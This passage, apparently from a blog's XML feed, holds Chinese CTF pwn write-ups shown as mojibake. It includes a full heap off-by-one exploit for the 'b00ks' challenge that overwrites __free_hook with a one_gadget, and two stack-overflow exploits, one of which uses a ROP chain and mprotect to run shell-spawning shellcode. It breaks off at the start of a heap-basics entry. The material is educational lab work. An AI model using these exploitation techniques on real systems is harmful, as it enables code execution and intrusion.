ã€‚é‚£ä¹ˆæˆ‘ä»¬å»æƒ³æƒ³ä¸€æƒ³ï¼Œè°ƒç”¨ä¸€æœ¬ä¹¦çš„æµç¨‹ï¼šé¦–å…ˆæ˜¯å’Œå›¾ä¹¦idå¯¹åº”ç€å›¾ä¹¦çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç»“æ„ä½“æŒ‡é’ˆå¯¹åº”ç€ç»“æ„ä½“ï¼Œç»“æ„ä½“å¸¦åŠ¨å…¶ä¸­çš„æˆå‘˜å˜é‡ã€‚é‚£ä¹ˆä¸Šå›¾æˆ‘ä»¬é€šè¿‡\x00è¦†ç›–ä¹‹ååŸæœ‰çš„ç»“æ„ä½“æŒ‡é’ˆå˜æˆäº†0x0000555555a020b0ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå»0x0000555555a020b0çš„ä½ç½®å¯»æ‰¾ç»“æ„ä½“ã€‚å¦‚æœæˆ‘ä»¬åœ¨åŸæœ‰çš„book1çš„book1_descçš„ä½ç½®ä¼ªé€ ä¸€ä¸ªç»“æ„ä½“ï¼Œç„¶ååœ¨è¿›è¡Œ\xb0è¦†ç›–ï¼Œé‚£ä¹ˆå°±æŠŠä¼ªé€ çš„ç»“æ„ä½“å½“åšbook1æ¥å®ç°ï¼š</p><p><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306211151.png" alt="Pasted image 20250306211151"></p><p>book1=0x0000555555a02130<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306211606.png" alt="Pasted image 20250306211606"></p><ul><li>book2_name-book1_addr=0x555555a02168-0x0000555555a02130=0x38</li><li>book2_desc - book1_addr = 0x0000555555a02170 - 0x0000555555a02130 = 0x40 <pre class="line-numbers language-none"><code class="language-none">payload &#x3D; p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>æˆ‘ä»¬éƒ¨ç½²å¥½ç»“æ„ä½“ä¹‹åè¿˜éœ€è¦é‡æ–°ä¿®æ”¹ä¸€ä¸‹ä½œè€…åï¼Œå› ä¸ºæˆ‘ä»¬çš„ç»“æ„ä½“æ˜¯å†™åœ¨åŸbook1_descä¸­çš„ï¼Œæ‰€ä»¥æŒ‰ç…§æ”»å‡»æµç¨‹ä¸Šæ¥è¯´åº”è¯¥å…ˆéƒ¨ç½²ä¼ªé€ çš„ç»“æ„ä½“ï¼Œç„¶åå†ä½¿ç”¨<code>\x00</code>è¦†ç›–book1ç»“æ„ä½“æŒ‡é’ˆï¼Œä½¿æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“</li></ul><p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬æŒ‰<code>c</code>å›åˆ°ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œå…ˆä¿®æ”¹ä½œè€…åï¼Œç„¶åå†æ¬¡æ‰§è¡Œæ‰“å°åŠŸèƒ½ï¼Œå°±ä¼šå°†book2_nameå’Œbook2_descæ‰“å°å‡ºæ¥äº†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">book1_addr &#x3D; 0x555555757730payload &#x3D; p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)editbook(book_id_1, payload)changename(&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;)book_id_1, book_name, book_des, book_author &#x3D; printbook(1)book2_name_addr &#x3D; u64(book_name.ljust(8,&quot;\x00&quot;))book2_des_addr &#x3D; u64(book_des.ljust(8,&quot;\x00&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level&#x3D;&#39;info&#39;context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]p&#x3D;process(&#39;.&#x2F;b00ks&#39;)libc&#x3D;ELF(&#39;&#x2F;home&#x2F;zechariah&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;libc.so.6&#39;)def create_book(name_size, name, des_size, des):    p.sendlineafter(&#39;&gt; &#39;, &#39;1&#39;)    p.sendlineafter(&#39;name size: &#39;, str(name_size))    p.sendlineafter(&#39;chars): &#39;, name)    p.sendlineafter(&#39;description size: &#39;, str(des_size))    p.sendlineafter(&#39;description: &#39;, des)def delete_book(id):    p.sendlineafter(&#39;&gt; &#39;, &#39;2&#39;)    p.sendlineafter(&#39;delete: &#39;, str(id))def edit_book(id,new_des):    p.sendlineafter(&#39;&gt; &#39;, &#39;3&#39;)    p.sendlineafter(&#39;edit: &#39;, str(id))    p.sendlineafter(&#39;description: &#39;, new_des)def print_book(id):    p.sendlineafter(&#39;&gt; &#39;, &#39;4&#39;)    p.recvuntil(&#39;: &#39;)    for i in range(id):        book_id&#x3D;int(p.recvline()[:-1])        p.recvuntil(&#39;: &#39;)        book_name&#x3D;p.recvline()[:-1]        p.recvuntil(&#39;: &#39;)        book_des&#x3D;p.recvline()[:-1]        p.recvuntil(&#39;: &#39;)        book_author&#x3D;p.recvline()[:-1]    return book_id,book_name,book_des,book_authordef change_author(author_name):    p.sendlineafter(&#39;&gt; &#39;, &#39;5&#39;)    p.sendlineafter(&#39;name: &#39;,author_name)def createname(name):        p.readuntil(&quot;name: &quot;)        p.sendline(name)createname(&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;)create_book(208,&#39;Zechariah&#39;,32,&#39;Zechariah_des1&#39;)&#x2F;&#x2F;æ ¹æ®å®é™…è®¡ç®—create_book(0x21000,&#39;Zechariah&#39;,0x21000,&#39;Zechariah_des2&#39;)book_id,book_name,book_des,book_author&#x3D;print_book(1)book1_addr&#x3D;u64(book_author[32:32+6].ljust(8,b&#39;\x00&#39;))success(&quot;book1_addr: &quot;+hex(book1_addr))payload &#x3D; p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)edit_book(1, payload)change_author(&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;)book_id, book_name, book_des, book_author &#x3D; print_book(1)book2_name_addr &#x3D; u64(book_name.ljust(8,b&quot;\x00&quot;))book2_des_addr &#x3D; u64(book_des.ljust(8,b&quot;\x00&quot;))success(&quot;book2_name_addr: &quot;+hex(book2_name_addr))#0x7ffff7fd2010-0x7ffff7800000libc_base &#x3D; book2_name_addr - (0x7ffff7fd2010-0x7ffff7800000)success(&quot;libc_base: &quot;+hex(libc_base))free_hook &#x3D; libc_base + libc.symbols[&quot;__free_hook&quot;]one_gadget &#x3D; libc_base+0x4525a #0x4525a 0xef9f4 0xf0897log.success(&quot;free_hook:&quot; + hex(free_hook))log.success(&quot;one_gadget:&quot; + hex(one_gadget))edit_book(1, p64(free_hook))edit_book(2, p64(one_gadget))delete_book(2)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-mprotectä¿®æ”¹å†…å­˜ä¿æŠ¤æƒé™</title>
      <link href="/2025/03/03/PWN%E6%8A%80%E5%B7%A7-mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9D%83%E9%99%90/"/>
      <url>/2025/03/03/PWN%E6%8A%80%E5%B7%A7-mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p>mprotect å‡½æ•°ç”¨äºè®¾ç½®ä¸€å—å†…å­˜çš„ä¿æŠ¤æƒé™ï¼ˆå°†ä» start å¼€å§‹ã€é•¿åº¦ä¸º len çš„å†…å­˜çš„ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸º prot æŒ‡å®šçš„å€¼ï¼‰ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹æ‰€ç¤ºï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;sys&#x2F;mman.h&gt;int mprotect(void *addr, size_t len, int prot);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><ul><li>prot çš„å–å€¼å¦‚ä¸‹ï¼Œé€šè¿‡ <code>|</code> å¯ä»¥å°†å‡ ä¸ªå±æ€§ç»“åˆä½¿ç”¨ï¼ˆå€¼ç›¸åŠ ï¼‰ï¼š<ul><li><code>PROT_READ</code>ï¼šå¯å†™ï¼Œå€¼ä¸º 1</li><li><code>PROT_WRITE</code>ï¼šå¯è¯»ï¼Œ å€¼ä¸º 2</li><li><code>PROT_EXEC</code>ï¼šå¯æ‰§è¡Œï¼Œå€¼ä¸º 4</li><li><code>PROT_NONE</code>ï¼šä¸å…è®¸è®¿é—®ï¼Œå€¼ä¸º 0</li></ul></li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ï¼Œèµ·å§‹åœ°å€ start å¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦ len å¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚</p><p>å¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œå‡½æ•°è¿”å› 0ï¼›å¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œå‡½æ•°è¿”å› -1ï¼Œå¹¶ä¸”é€šè¿‡ errno å˜é‡è¡¨ç¤ºå…·ä½“åŸå› ã€‚é”™è¯¯çš„åŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li><code>EACCES</code>ï¼šè¯¥å†…å­˜ä¸èƒ½è®¾ç½®ä¸ºç›¸åº”æƒé™ã€‚è¿™æ˜¯å¯èƒ½å‘ç”Ÿçš„ï¼Œæ¯”å¦‚ mmap(2) æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ä¸ºåªè¯»çš„ï¼Œæ¥ç€ä½¿ç”¨ mprotect() ä¿®æ”¹ä¸º PROT_WRITEã€‚</li><li><code>EINVAL</code>ï¼šstart ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆæŒ‡é’ˆï¼ŒæŒ‡å‘çš„ä¸æ˜¯æŸä¸ªå†…å­˜é¡µçš„å¼€å¤´ã€‚</li><li><code>ENOMEM</code>ï¼šå†…æ ¸å†…éƒ¨çš„ç»“æ„ä½“æ— æ³•åˆ†é…ã€‚</li><li><code>ENOMEM</code>ï¼šè¿›ç¨‹çš„åœ°å€ç©ºé—´åœ¨åŒºé—´ [start, start+len] èŒƒå›´å†…æ˜¯æ— æ•ˆï¼Œæˆ–è€…æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå†…å­˜é¡µæ²¡æœ‰æ˜ å°„ã€‚</li></ul><p>å½“ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜è®¿é—®è¡Œä¸ºè¿èƒŒäº†å†…å­˜çš„ä¿æŠ¤å±æ€§ï¼Œå†…æ ¸å°†å‘å‡º SIGSEGVï¼ˆSegmentation faultï¼Œæ®µé”™è¯¯ï¼‰ä¿¡å·ï¼Œå¹¶ä¸”ç»ˆæ­¢è¯¥è¿›ç¨‹ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¾‹é¢˜æ¥è‡ª 2020 å®‰ç½‘æ¯ï¼Œpwn1 æ˜¯ç›¸å¯¹ç®€å•å¯¹æ ˆæº¢å‡ºï¼Œpwn2 åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ äº† mprotect çš„è¿ç”¨ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€ä¸ªé™æ€ç¼–è¯‘çš„ç¨‹åºã€‚<br>å…ˆæ¥çœ‹ pwn1ï¼Œè¿™æ˜¯ä¸€ä¸ª 64 ä½çš„åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œå¼€å¯äº† Partial RELRO å’Œ NXã€‚ç³»ç»Ÿå±‚é¢ ASLR ä¹Ÿæ˜¯å¼€å¯çš„ã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ file pwn1 pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;f92248c7cd330ab53768c281b50d14b4612259f4, not stripped$ pwn checksec pwn1    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>ä¸»å‡½æ•° main() å…ˆè°ƒç”¨ write() æ‰“å°å­—ç¬¦ä¸²ï¼Œç„¶åè¿›å…¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„ vul() å‡½æ•°ï¼Œ<code>read(0, &amp;buf, 0x100uLL)</code> è¯»å…¥æœ€å¤š 0x100 å­—èŠ‚åˆ° 0x80 å¤§å°çš„ç¼“å†²åŒºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.text:0000000000400587 ; int __cdecl main(int argc, const char **argv, const char **envp).text:0000000000400587 public main.text:0000000000400587 main proc near.text:0000000000400587 ; __unwind &#123;.text:0000000000400587 push    rbp.text:0000000000400588 mov     rbp, rsp.text:000000000040058B mov     edx, 9          ; n.text:0000000000400590 mov     esi, offset aWelcome ; &quot;welcome~\n&quot;.text:0000000000400595 mov     edi, 1          ; fd.text:000000000040059A call    _write.text:000000000040059F call    vul.text:00000000004005A4 mov     eax, 0.text:00000000004005A9 pop     rbp.text:00000000004005AA retn.text:00000000004005AA ; &#125; &#x2F;&#x2F; starts at 400587.text:00000000004005AA main endp.text:0000000000400566 public vul.text:0000000000400566 vul proc near.text:0000000000400566.text:0000000000400566 buf&#x3D; byte ptr -80h.text:0000000000400566.text:0000000000400566 ; __unwind &#123;.text:0000000000400566 push    rbp.text:0000000000400567 mov     rbp, rsp.text:000000000040056A add     rsp, 0FFFFFFFFFFFFFF80h.text:000000000040056E lea     rax, [rbp+buf].text:0000000000400572 mov     edx, 100h       ; nbytes.text:0000000000400577 mov     rsi, rax        ; buf.text:000000000040057A mov     edi, 0          ; fd.text:000000000040057F call    _read.text:0000000000400584 nop.text:0000000000400585 leave.text:0000000000400586 retn.text:0000000000400586 ; &#125; &#x2F;&#x2F; starts at 400566.text:0000000000400586 vul endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ä½“æ€è·¯å°±æ˜¯æ ˆæº¢å‡ºæ§åˆ¶è¿”å›åœ°å€ï¼Œæ‰§è¡Œ one-gadgetã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„æ¼ libc åœ°å€ï¼Œç¨‹åºé‡Œæœ‰ write() å‡½æ•°å¯ä»¥åˆ©ç”¨ã€‚exp å¦‚ä¸‹æ‰€ç¤ºï¼š<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)io &#x3D; process(&#39;.&#x2F;pwn1&#39;)elf &#x3D; ELF(&#39;.&#x2F;pwn1&#39;)libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)pop_rsi_r15 &#x3D; 0x400611pop_rdi &#x3D; 0x400613write &#x3D; 0x400595payload &#x3D; &quot;A&quot;*0x88 + p64(pop_rsi_r15) + p64(elf.got[&#39;write&#39;])*2 + p64(write)io.sendlineafter(&#39;welcome~\n&#39;, payload)write_addr &#x3D; u64(io.recv(8))io.recv()one_gadget &#x3D; write_addr - libc.sym[&#39;write&#39;] + 0x4527apayload &#x3D; &quot;A&quot;*0x88 + p64(one_gadget)io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><blockquote><p>ç»æµ‹è¯•ï¼Œone-gadgetåœ¨æœ¬é¢˜ä¸­å¹¶ä¸é€šç”¨ï¼Œå»ºè®®è‡ªè¡Œæ„é€ ROPé“¾</p></blockquote><p>pwn2 æ˜¯ä¸€ä¸ª 64 ä½çš„é™æ€é“¾æ¥ç¨‹åºï¼Œå¼€å¯äº† Partial RELRO å’Œ NXã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ file pwn2 pwn2: ELF 64-bit LSB executable, x86-64, version 1 (GNU&#x2F;Linux), statically linked, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;a3abf349ced6dccd645f0a95d9d47e8ac1217e3e, not stripped$ pwn checksec pwn2     Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºé™æ€é“¾æ¥ç¨‹åºçš„æ‰§è¡Œä¸å†éœ€è¦ libcï¼Œå› æ­¤ ret2libc ç±»å‹çš„æ”»å‡»æ‰‹æ®µå°±å¤±æ•ˆäº†ï¼Œéœ€è¦è€ƒè™‘æ³¨å…¥ shellcodeï¼Œä½†æ˜¯åˆå¼€å¯äº† NX ä¿æŠ¤ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨æœ¬èŠ‚æ‰€è®²çš„ mprotect() å‡½æ•°ä¿®æ”¹æ ˆçš„å¯æ‰§è¡Œæƒé™ã€‚</p><p>å¯ä»¥åœ¨ç¨‹åºé‡Œæ‰¾åˆ°å…³é”®å‡½æ•° _dl_make_stack_executable()ï¼Œè¯¥å‡½æ•°å†…éƒ¨è°ƒç”¨äº† <code>mprotect(v3, dl_pagesize, (unsigned int)_stack_prot)</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ readelf -s pwn2 | grep exec   635: 0000000000499f70  2296 FUNC    LOCAL  DEFAULT    6 execute_cfa_program   639: 000000000049af40  2094 FUNC    LOCAL  DEFAULT    6 execute_stack_op   821: 0000000000474730    92 FUNC    GLOBAL DEFAULT    6 _dl_make_stack_executable  1831: 00000000006cb168     8 OBJECT  GLOBAL DEFAULT   25 _dl_make_stack_executable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unsigned int __fastcall dl_make_stack_executable(_QWORD *a1)&#123;  __int64 v1; &#x2F;&#x2F; rdx  _QWORD *v2; &#x2F;&#x2F; rax  signed __int64 v3; &#x2F;&#x2F; rdi  _QWORD *v4; &#x2F;&#x2F; rbx  unsigned int result; &#x2F;&#x2F; eax  v1 &#x3D; *a1;  v2 &#x3D; a1;  v3 &#x3D; *a1 &amp; -(signed __int64)dl_pagesize;  if ( v1 !&#x3D; _libc_stack_end )    return 1;  v4 &#x3D; v2;  result &#x3D; mprotect(v3, dl_pagesize, (unsigned int)_stack_prot);  if ( result )    return __readfsdword(0xFFFFFFD0);  *v4 &#x3D; 0LL;  dl_stack_flags |&#x3D; 1u;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ æ–¹æ³•æ˜¯åœ¨è¿›å…¥ _dl_make_stack_executable å‡½æ•°ä¹‹å‰ï¼Œå°†å…¨å±€å˜é‡ _stack_prot è®¾ç½®ä¸º 7ï¼ˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼‰ï¼ŒåŒæ—¶å°† rdi è®¾ç½®ä¸ºå…¨å±€å˜é‡ __libc_stack_end çš„å€¼ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">gefâ¤  x&#x2F;gx $rsp-0x100x7ffef00bbb08:0x41414141414141410x7ffef00bbb10:0x41414141414141410x7ffef00bbb18:0x00000000004015e7  # pop rsi ; ret0x7ffef00bbb20:0x0000000000000007      # rwx0x7ffef00bbb28:0x00000000004014c6  # pop rdi ; ret0x7ffef00bbb30:0x00000000006c9fe0      # __stack_prot0x7ffef00bbb38:0x000000000047a3b2  # mov [rdi], rsi0x7ffef00bbb40:0x00000000004014c6  # pop rdi ; ret0x7ffef00bbb48:0x00000000006c9f90      # __libc_stack_end0x7ffef00bbb50:0x0000000000474730      # _dl_make_stack_executable0x7ffef00bbb58:0x00000000004009e7      # vul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒç”¨ mprotect å‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">     0x474754 &lt;_dl_make_stack_executable+36&gt; add    BYTE PTR [rbx+0x48], dl     0x474757 &lt;_dl_make_stack_executable+39&gt; mov    ebx, eax â†’   0x474759 &lt;_dl_make_stack_executable+41&gt; call   0x43fd00 &lt;mprotect&gt;   â†³    0x43fd00 &lt;mprotect+0&gt;     mov    eax, 0xa        0x43fd05 &lt;mprotect+5&gt;     syscall         0x43fd07 &lt;mprotect+7&gt;     cmp    rax, 0xfffffffffffff001mprotect (   $rdi &#x3D; 0x00007ffef00bb000 â†’ 0x0000000000000000,   $rsi &#x3D; 0x0000000000001000,   $rdx &#x3D; 0x0000000000000007)gefâ¤  vmmap [ Legend:  Code | Heap | Stack ]Start              End                Offset             Perm Path0x0000000000400000 0x00000000004ca000 0x0000000000000000 r-x &#x2F;home&#x2F;firmy&#x2F;pwn&#x2F;pwn2&#x2F;pwn20x00000000006c9000 0x00000000006cc000 0x00000000000c9000 rw- &#x2F;home&#x2F;firmy&#x2F;pwn&#x2F;pwn2&#x2F;pwn20x00000000006cc000 0x00000000006ce000 0x0000000000000000 rw- 0x00000000009b6000 0x00000000009d9000 0x0000000000000000 rw- [heap]0x00007ffef009d000 0x00007ffef00be000 0x0000000000000000 rw- [stack]0x00007ffef0194000 0x00007ffef0197000 0x0000000000000000 r-- [vvar]0x00007ffef0197000 0x00007ffef0199000 0x0000000000000000 r-x [vdso]0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒç”¨ mprotect åï¼Œå¯ä»¥çœ‹åˆ° 0x00007ffef00bb000 åˆ° 0x00007ffef00bc000 çš„æ ˆå†…å­˜å·²ç»æ˜¯ rwx æƒé™äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gefâ¤  vmmap [ Legend:  Code | Heap | Stack ]Start              End                Offset             Perm Path0x0000000000400000 0x00000000004ca000 0x0000000000000000 r-x &#x2F;home&#x2F;firmy&#x2F;pwn&#x2F;pwn2&#x2F;pwn20x00000000006c9000 0x00000000006cc000 0x00000000000c9000 rw- &#x2F;home&#x2F;firmy&#x2F;pwn&#x2F;pwn2&#x2F;pwn20x00000000006cc000 0x00000000006ce000 0x0000000000000000 rw- 0x00000000009b6000 0x00000000009d9000 0x0000000000000000 rw- [heap]0x00007ffef009d000 0x00007ffef00bb000 0x0000000000000000 rw- 0x00007ffef00bb000 0x00007ffef00bc000 0x0000000000000000 rwx [stack]0x00007ffef00bc000 0x00007ffef00be000 0x0000000000000000 rw- 0x00007ffef0194000 0x00007ffef0197000 0x0000000000000000 r-- [vvar]0x00007ffef0197000 0x00007ffef0199000 0x0000000000000000 r-x [vdso]0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ç¨‹åºè·³åˆ° vul å‡½æ•°ï¼Œè¯»å…¥ shellcode åˆ°æ ˆä¸Šå¹¶æ‰§è¡Œï¼Œå³å¯è·å¾— shellã€‚exp å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)io &#x3D; process(&#39;.&#x2F;pwn2&#39;)elf &#x3D; ELF(&#39;.&#x2F;pwn2&#39;)vul &#x3D; 0x4009E7write &#x3D; 0x4009DDpop_rdi &#x3D; 0x4014c6pop_rsi &#x3D; 0x4015e7pop_rdx &#x3D; 0x442626jmp_rsi &#x3D; 0x4a3313mov_rdi_esi &#x3D; 0x47a3b3payload  &#x3D; &quot;A&quot;*0x88payload +&#x3D; p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[&#39;__stack_prot&#39;]) + p64(mov_rdi_esi)payload +&#x3D; p64(pop_rdi) + p64(elf.sym[&#39;__libc_stack_end&#39;]) + p64(elf.sym[&#39;_dl_make_stack_executable&#39;])payload +&#x3D; p64(vul)io.sendlineafter(&#39;welcome~\n&#39;, payload)shellcode &#x3D; asm(shellcraft.sh())payload &#x3D; shellcode.ljust(0x88, &quot;A&quot;) + p64(jmp_rsi)io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †ç›¸å…³æ•´ç†</title>
      <link href="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/"/>
      <url>/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="What-is-å †ï¼Ÿ"><a href="#What-is-å †ï¼Ÿ" class="headerlink" title="What is å †ï¼Ÿ"></a>What is å †ï¼Ÿ</h2><p>æ˜ç¡®ä¸€ä¸‹å †çš„æ¦‚å¿µï¼Œå †ä¸åŒäºæ ˆï¼Œå †æ˜¯åŠ¨æ€åˆ†é…çš„ï¼ˆç”±æ“ä½œç³»ç»Ÿå†…æ ¸æˆ–è€…å †ç®¡ç†å™¨ï¼‰ï¼Œåªæœ‰åœ¨ç¨‹åºä¸­éœ€è¦æ—¶æ‰ä¼šåˆ†é…ã€‚åœ¨ CTF çš„ pwn ç¨‹åºä¸­ï¼Œæ ˆæ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜åå°±ä¼šå‡ºç°ï¼Œè€Œå †æ˜¯ç”± mallocã€allocã€realloc å‡½æ•°åˆ†é…å†…å­˜åæ‰ä¼šå‡ºç°ã€‚</p><ul><li>windows å’Œ linux ä¸‹çš„å †åˆ†é…ã€ç®¡ç†æ–¹å¼éƒ½ä¸åŒï¼Œ<strong>è¿™é‡Œä¸»è¦è®²åˆ°çš„æ˜¯ CTF ä¸­å¸¸å‡ºç°çš„ linux ä¸‹çš„å †åˆ†é…çŸ¥è¯†</strong><br>å…ˆçœ‹çœ‹å †åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ä½ç½®<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225175129.png" alt="Pasted image 20250225175129"></li><li><strong>å †çš„ç”Ÿé•¿æ–¹å‘æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿çš„ï¼Œè€Œæ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿çš„ã€‚</strong><br>å®é™…ä¸Šå 